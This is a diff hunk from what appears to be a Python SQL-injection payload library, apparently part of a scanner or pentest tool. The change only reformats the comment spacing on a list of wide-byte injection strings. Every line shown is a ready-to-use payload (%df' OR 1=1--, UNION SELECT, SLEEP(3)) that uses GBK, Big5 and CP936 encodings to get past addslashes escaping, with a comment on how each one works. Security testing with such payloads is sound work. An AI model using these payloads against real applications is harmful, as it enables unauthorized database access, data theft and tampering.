@@ -372,19 +372,19 @@ def get_time_payloads(db_type: str = "mysql", limit: int = 8) -> List[str]:
 # ── Wide-Byte Injection (GBK bypass for addslashes/magic_quotes) ──
 
 WIDE_BYTE_PAYLOADS: List[str] = [
-    "%df'",                          # Classic GBK wide-byte: %df' → 運'
-    "%df%5c",                        # %df%5c → 縗 (consumes the backslash)
-    "%bf%27",                        # Big5 variant
-    "%df%27",                        # Direct wide-byte quote
-    "%aa%5c",                        # Consumes backslash via valid 2-byte
-    "%81%5c",                        # Another GBK backslash consumer
-    "%8e%5c",                        # CP936 variant
-    "%99%5c",                        # Shift-JIS-like backslash consumption
-    "' %%df%27 --",                  # Mixed: normal quote then wide-byte
-    "1%df%27 AND 1=1--",            # Wide-byte with boolean context
-    "%df' OR 1=1--",                 # Wide-byte OR injection
-    "%df' UNION SELECT 1,2,3--",     # Wide-byte UNION
-    "%df' AND SLEEP(3)--",           # Wide-byte time-based
+    "%df'",  # Classic GBK wide-byte: %df' → 運'
+    "%df%5c",  # %df%5c → 縗 (consumes the backslash)
+    "%bf%27",  # Big5 variant
+    "%df%27",  # Direct wide-byte quote
+    "%aa%5c",  # Consumes backslash via valid 2-byte
+    "%81%5c",  # Another GBK backslash consumer
+    "%8e%5c",  # CP936 variant
+    "%99%5c",  # Shift-JIS-like backslash consumption
+    "' %%df%27 --",  # Mixed: normal quote then wide-byte
+    "1%df%27 AND 1=1--",  # Wide-byte with boolean context
+    "%df' OR 1=1--",  # Wide-byte OR injection
+    "%df' UNION SELECT 1,2,3--",  # Wide-byte UNION
+    "%df' AND SLEEP(3)--",  # Wide-byte time-based
 ]
 
 # ── Second-Order SQLi Payloads ─────────────────────────────────
